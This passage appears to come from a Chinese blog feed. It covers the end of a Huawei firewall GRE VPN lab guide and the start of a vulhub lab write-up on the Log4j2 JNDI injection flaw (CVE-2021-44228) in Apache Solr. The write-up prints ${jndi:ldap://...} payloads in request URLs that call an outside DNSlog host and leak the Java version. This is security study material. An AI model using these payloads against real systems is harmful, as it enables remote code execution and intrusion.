&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int Tunnel 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-Tunnel0]ip address 172.16.10.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-Tunnel0]tunnel-protocol gre&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-Tunnel0]source 202.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-Tunnel0]destination 202.0.0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-Tunnel0]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2]int Tunnel 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-Tunnel0]ip address 172.16.10.2 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-Tunnel0]tunnel-protocol gre&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-Tunnel0]source 202.0.0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-Tunnel0]destination 202.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-Tunnel0]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;然后配置安全区域&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone trust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-trust]add interface g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone untrust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-untrust]add interface g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone dmz &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-dmz]add interface Tunnel 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-dmz]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2]firewall zone trust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-trust]add interface g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2]firewall zone untrust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-untrust]add interface g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2]firewall zone dmz &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-dmz]add interface Tunnel 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-zone-dmz]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;然后配置防火墙的静态路由&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]ip route-static 192.168.1.0 24 Tunnel 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2]ip route-static 192.168.0.0 24 Tunnel 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;最后就是配置三条安全策略&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security]display this&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2024-05-27 11:10:27.880 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;security-policy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rule name gre1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-zone trust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-zone dmz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-address 192.168.0.0 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-address 192.168.1.0 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  action permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rule name gre2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-zone dmz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-zone trust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-address 192.168.1.0 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-address 192.168.0.0 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  action permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rule name gre3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-zone local&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-zone untrust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-zone local&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-zone untrust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  service gre&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  action permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2-policy-security]display this&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2024-05-27 11:14:21.890 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;security-policy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rule name gre1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-zone trust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-zone dmz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-address 192.168.1.0 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-address 192.168.0.0 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  action permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rule name gre2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-zone dmz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-zone trust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-address 192.168.0.0 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-address 192.168.1.0 mask 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  action permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rule name gre3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-zone local&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source-zone untrust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-zone local&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination-zone untrust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  service gre&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  action permit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;至此便完成了GRE VPN的配置，然后进行测试，不同内网中的主机是可以相互通信的，同样可以wireshark抓包进行查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/image-20240527191751145.png&#34; alt=&#34;image-20240527191751145&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/Screenshot_20240603_205336_net.csdn.csdnplus.jpg&#34; alt=&#34;Screenshot_20240603_205336_net.csdn.csdnplus&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
            <title>【vulhub】Log4j2漏洞复现</title>
            <link>https://w-sqrt7.github.io/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Sun, 26 May 2024 11:14:31 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】Log4j2漏洞复现&#34;&gt;&lt;a href=&#34;#【vulhub】Log4j2漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】Log4j2漏洞复现&#34;&gt;&lt;/a&gt;【vulhub】Log4j2漏洞复现&lt;/h1&gt;&lt;h2 id=&#34;log4j2&#34;&gt;&lt;a href=&#34;#log4j2&#34; class=&#34;headerlink&#34; title=&#34;log4j2&#34;&gt;&lt;/a&gt;log4j2&lt;/h2&gt;&lt;p&gt;log4j是Apache的一个开源项目，是一个基于Java的日志记录框架。Log4j2是log4j的后继者，被大量用于业务系统开发，记录日志信息。&lt;/p&gt;
&lt;p&gt;log4j2 中存在JNDI注入漏洞，Log4j2 组件在开启了日志记录功能后，凡是在可触发错误记录日志的地方，插入漏洞利用代码，即可利用成功。特殊情况下，若该组件记录的日志包含其他系统的记录日志，则有可能造成间接投毒。通过中间系统，使得组件间接读取了具有攻击性的漏洞利用代码，亦可间接造成漏洞触发。&lt;/p&gt;
&lt;p&gt;同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，例如 Apache Struts2、Apache Solr、Apache Druid、Apache Flink、Tomcat、Weblogic、ES、Redis等&lt;/p&gt;
&lt;h2 id=&#34;JNDI&#34;&gt;&lt;a href=&#34;#JNDI&#34; class=&#34;headerlink&#34; title=&#34;JNDI&#34;&gt;&lt;/a&gt;JNDI&lt;/h2&gt;&lt;p&gt;JNDI 是 Java Naming and Directory Interface 的缩写，是 Java 中用于访问各种命名和目录服务的API（应用程序编程接口）。JNDI 提供了一种标准的方式来访问各种命名和目录服务，相当于一个用于映射的字典，从指定的远程服务器获取并加载对象，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。&lt;/p&gt;
&lt;p&gt;其中常用的协议包括 RMI（远程方法调用）和 LDAP（轻量目录访问协议）。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务，以LDAP服务为例进行复现。&lt;/p&gt;
&lt;h2 id=&#34;lookup：&#34;&gt;&lt;a href=&#34;#lookup：&#34; class=&#34;headerlink&#34; title=&#34;lookup：&#34;&gt;&lt;/a&gt;lookup：&lt;/h2&gt;&lt;p&gt;log4j2框架下的lookup查询服务是一种查找机制，用于动态获取和替换日志记录中的变量或属性的值，提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。&lt;/p&gt;
&lt;p&gt;攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，jdk将从url指定的路径下载一段字节流，并将其反序列化为Java对象，作为jndi返回。反序列化过程中，即会执行字节流中包含的程序，造成了远程代码执行。&lt;/p&gt;
&lt;p&gt;log4j中除了sys解析器外，还有很多其他类型的解析器。其中，jndi 解析器就是本次漏洞的源头。&lt;/p&gt;
&lt;h2 id=&#34;LDAP：&#34;&gt;&lt;a href=&#34;#LDAP：&#34; class=&#34;headerlink&#34; title=&#34;LDAP：&#34;&gt;&lt;/a&gt;LDAP：&lt;/h2&gt;&lt;p&gt;LDAP(轻型目录访问协议)是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。&lt;/p&gt;
&lt;h2 id=&#34;RMI：&#34;&gt;&lt;a href=&#34;#RMI：&#34; class=&#34;headerlink&#34; title=&#34;RMI：&#34;&gt;&lt;/a&gt;RMI：&lt;/h2&gt;&lt;p&gt;RMI（远程方法调用）：它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。&lt;/p&gt;
&lt;h2 id=&#34;漏洞环境&#34;&gt;&lt;a href=&#34;#漏洞环境&#34; class=&#34;headerlink&#34; title=&#34;漏洞环境&#34;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;p&gt;Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。&lt;/p&gt;
&lt;p&gt;如一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Log4j 2.x &amp;lt;&amp;#x3D; 2.14.1 &amp;lt;&amp;#x3D; Log4j 2.15.0-rc1&lt;/p&gt;
&lt;h1 id=&#34;CVE-2021-44228&#34;&gt;&lt;a href=&#34;#CVE-2021-44228&#34; class=&#34;headerlink&#34; title=&#34;CVE-2021-44228&#34;&gt;&lt;/a&gt;CVE-2021-44228&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理&#34;&gt;&lt;a href=&#34;#漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理&#34;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;攻击者构造payload，在JNDI接口lookup查询进行注入，payload为${jndi:ldap:恶意url&amp;#x2F;poc}，JNDI会去对应的服务（如LDAP、RMI、DNS、文件系统、目录服务…）查找资源，由于lookup的出栈没做限制，最终指向了攻击者部署好的恶意站点，下载了远程的恶意class，最终造成了远程代码执行rce。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;详细过程分析：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;log4j2 框架下的 lookup 查询服务提供了 {} 字段解析功能，传进去的值会被直接解析。&lt;/p&gt;
&lt;p&gt;当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RMI&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;假如日志中含有该语句${jndi:&amp;#x2F;&amp;#x2F;rmi:服务器地址&amp;#x2F;Exploit}&lt;/p&gt;
&lt;p&gt;被攻击服务器发现要输出的信息中有 ${}，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMI，而后根据RMI服务器地址去请求Exploit。&lt;/p&gt;
&lt;p&gt;RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类），而该Reference指定了远端文件下载服务器上含有恶意代码的class文件。&lt;/p&gt;
&lt;p&gt;被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。&lt;/p&gt;
&lt;p&gt;被攻击服务器下载恶意class文件并执行其中的恶意代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;LDAP&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;假如日志中含有该语句${jndi:ldap:192.168.100.131:5555&amp;#x2F;exp}&lt;/p&gt;
&lt;p&gt;被攻击服务器发现要输出的信息中有 ${}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099&amp;#x2F;exp&lt;/p&gt;
&lt;p&gt;解析到ldap，就会去192.168.61.129:1099的ldap服务找名为exp的资源，如果找不到就会去http服务中找，在http中找到exp之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现exp是一个.class文件，就会去执行里面的代码，从而实现注入攻击者就可以通过shell实现任意的命令执行，造成严重危害&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-26%20124201.png&#34; alt=&#34;屏幕截图 2024-05-26 124201&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;首先要找到注入点，尝试传入参数，&amp;#x2F;solr&amp;#x2F;admin&amp;#x2F;cores?action&amp;#x3D;&lt;/p&gt;
&lt;p&gt;利用DNSlog平台进行漏洞验证&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8983/solr/admin/cores?action=$&amp;#123;jndi:ldap://xyzq33.dnslog.cn&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8983/solr/admin/cores?action=$&amp;#123;jndi:ldap://$&amp;#123;sys:java.version&amp;#125;.xyzq33.dnslog.cn&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526163239058.png&#34; alt=&#34;image-20240526163239058&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526163300422.png&#34; alt=&#34;image-20240526163300422&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以发现回显验证成功，即存在漏洞，然后尝试进行漏洞利用，获取shell。&lt;/p&gt;
